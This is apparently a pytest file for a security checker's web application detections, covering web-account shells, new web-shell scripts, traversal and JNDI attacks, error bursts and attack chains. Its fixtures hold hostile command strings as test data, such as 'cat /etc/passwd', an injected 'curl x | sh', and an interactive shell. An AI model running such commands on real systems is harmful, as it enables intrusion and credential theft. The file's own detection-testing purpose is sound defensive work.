"""Web application checks (PR 2.8b, DESIGN.md §8.12)."""

from datetime import timedelta

from test_checks import T0, ev, of, run
from test_checks_live import proc, snap

from checker.correlate import find_chains

ACCOUNTS = {"root": {"uid": 0}, "www-data": {"uid": 33}, "jch": {"uid": 1000}}


def exec_(minutes, uid, exe, argv, **fields):
    return ev(
        "process.exec",
        minutes,
        source="web_logs:audit",
        uid=uid,
        euid=uid,
        exe=exe,
        comm=exe.rsplit("/", 1)[-1],
        argv=argv,
        **fields,
    )


def request(minutes, path, status, network="203.0.113.0/24", **fields):
    return ev(
        "web.request",
        minutes,
        source="web_logs:/var/log/nginx/access.log",
        path=path,
        status=status,
        network=network,
        method="GET",
        **fields,
    )


def test_web_accounts_starting_shells_and_recon_from_the_audit_log():
    events = [
        exec_(1, 33, "/usr/bin/dash", "sh -c id"),
        exec_(2, 33, "/usr/bin/id", "id"),
        exec_(3, 33, "/usr/bin/dash", "sh -c id"),
        exec_(4, 33, "/usr/bin/cat", "cat /etc/passwd"),
        # PHP's mail(), an ordinary program, and someone else's shell: nothing.
        exec_(5, 33, "/usr/bin/dash", "sh -c /usr/sbin/sendmail -t -i"),
        exec_(6, 33, "/usr/bin/convert", "convert a.png b.jpg"),
        exec_(7, 1000, "/usr/bin/bash", "bash"),
    ]
    found = of(run(events, snap(accounts=ACCOUNTS)), "web.worker_child")
    assert [(f.summary.split(",")[0], f.band, f.variant) for f in found] == [
        ("www-data ran cat 1 time", "high", "history"),
        ("www-data ran dash 2 times", "high", "history"),
        ("www-data ran id 1 time", "high", "history"),
    ]
    assert "account:www-data" in found[0].entities


def test_sendmail_through_a_shell_with_more_is_still_a_shell():
    events = [exec_(1, 33, "/usr/bin/dash", "sh -c /usr/sbin/sendmail -t; curl x | sh")]
    assert of(run(events, snap(accounts=ACCOUNTS)), "web.worker_child")


def test_live_children_of_web_workers():
    processes = [
        proc(100, "php-fpm8.3", exe="/usr/sbin/php-fpm8.3", uids=[33, 33, 33, 33]),
        proc(101, "sh", ppid=100, exe="/usr/bin/dash", cmdline="sh -c id", uids=[33, 33, 33, 33]),
        # A web account's shell, but in an administrator's session.
        proc(200, "sshd", exe="/usr/sbin/sshd", uids=[0, 0, 0, 0]),
        proc(201, "sudo", ppid=200, exe="/usr/bin/sudo", uids=[0, 0, 0, 0]),
        proc(202, "bash", ppid=201, exe="/usr/bin/bash", cmdline="bash", uids=[33, 33, 33, 33]),
        # A web account's shell with no session: high.
        proc(300, "bash", exe="/usr/bin/bash", cmdline="bash -i", uids=[33, 33, 33, 33]),
        # nginx starting a helper that isn't suspicious.
        proc(400, "nginx", exe="/usr/sbin/nginx", uids=[0, 0, 0, 0]),
        proc(401, "logrotate", ppid=400, exe="/usr/sbin/logrotate", uids=[0, 0, 0, 0]),
    ]
    live = {"processes": processes, "sockets": []}
    found = of(run([], snap(live, accounts=ACCOUNTS)), "web.worker_child")
    assert sorted(f.summary.split(" (")[0] for f in found) == ["bash", "dash"]
    assert {f.variant for f in found} == {"live"}


def test_requests_answered_by_a_new_script():
    before = snap(web_files={"/var/www/html/index.php": {"type": "-"}})
    after = snap(
        accounts=ACCOUNTS,
        web_files={
            "/var/www/html/index.php": {"type": "-"},
            "/var/www/html/up/cc-shell.php": {"type": "-"},
            "/var/www/html/notes.txt": {"type": "-"},
        },
    )
    events = [
        request(1, "/up/cc-shell.php?c=[MASKED:value]", 200),
        request(2, "/up/cc-shell.php", 200),
        request(3, "/up/cc-shell.php", 404),  # not answered
        request(4, "/index.php", 200),  # not new
        request(5, "/notes.txt", 200),  # not a script
        request(6, "/up/cc%2Dshell.php", 200),  # encoded: the same file
    ]
    [found] = of(run(events, after, baseline=before), "web.new_script_hit")
    assert found.band == "high" and found.summary.startswith("/var/www/html/up/cc-shell.php: 3 ")
    assert "account:www-data" in found.entities
    assert of(run(events, after), "web.new_script_hit") == []  # no baseline yet


def test_attacks_answered_or_refused():
    events = [
        request(1, "/x?f=[MASKED:exploit:traversal]", 200, attacks=["traversal"]),
        request(2, "/y?f=[MASKED:exploit:traversal]", 500, attacks=["traversal"]),
        request(3, "/z?f=[MASKED:exploit:jndi]", 404, attacks=["jndi"]),
        request(4, "/z", 404, network="198.51.100.0/24", attacks=["jndi"]),
    ]
    found = {(f.summary.split(":")[0], f.title): f for f in of(run(events), "web.exploit")}
    assert found[("203.0.113.0/24", "A traversal attack answered")].band == "medium"
    assert found[("203.0.113.0/24", "A jndi attack refused")].band == "info"
    assert found[("198.51.100.0/24", "A jndi attack refused")].band == "info"
    assert (
        "2 requests (status 200, 500)"
        in found[("203.0.113.0/24", "A traversal attack answered")].summary
    )


def test_error_bursts_from_one_source():
    burst = [request(n / 10, "/api", 502) for n in range(20)]
    upstream = [
        ev("web.error", 1, network="198.51.100.0/24", message="upstream timed out", level="error")
        for _ in range(19)
    ]
    spread = [request(n * 10, "/api", 500, network="192.0.2.0/24") for n in range(30)]
    found = of(run(burst + upstream + spread), "web.errors")
    assert [f.summary.split(":")[0] for f in found] == ["203.0.113.0/24"]
    assert found[0].band == "low"


def test_background_noise_is_one_informational_line():
    live = {
        "processes": [],
        "sockets": [],
        "web_requests": {
            "requests_by_network": {
                "203.0.113.0/24": {"4xx": 40, "2xx": 5},
                "198.51.100.0/24": {"3xx": 2, "4xx": 8},
                "192.0.2.0/24": {"2xx": 100},
            }
        },
    }
    [found] = of(run([], snap(live)), "web.noise")
    assert found.band == "info"
    assert found.summary.startswith(
        "50 refused requests from 2 networks; most from 203.0.113.0/24 (40)"
    )
    quiet = {
        "processes": [],
        "sockets": [],
        "web_requests": {"requests_by_network": {"x": {"4xx": 3}}},
    }
    assert of(run([], snap(quiet)), "web.noise") == []


def test_a_new_script_then_a_shell_is_a_chain():
    before = snap(web_files={})
    after = snap(accounts=ACCOUNTS, web_files={"/var/www/html/cc-shell.php": {"type": "-"}})
    events = [request(1, "/cc-shell.php", 200), exec_(2, 33, "/usr/bin/dash", "sh -c id")]
    findings = [f.as_dict() for f in run(events, after, baseline=before)]
    chains = find_chains(findings, events, (T0 - timedelta(hours=1)).isoformat())
    assert [(c["chain"], c["account"]) for c in chains] == [("web-shell-used", "www-data")]


def test_web_accounts_named_at_setup_are_judged_too():
    accounts = dict(ACCOUNTS, shop={"uid": 1500})
    events = [exec_(1, 1500, "/usr/bin/dash", "sh -c id")]
    assert of(run(events, snap(accounts=accounts)), "web.worker_child") == []
    live = {"processes": [], "sockets": [], "web_accounts": {"names": ["shop", "www-data"]}}
    [found] = of(run(events, snap(live, accounts=accounts)), "web.worker_child")
    assert "account:shop" in found.entities
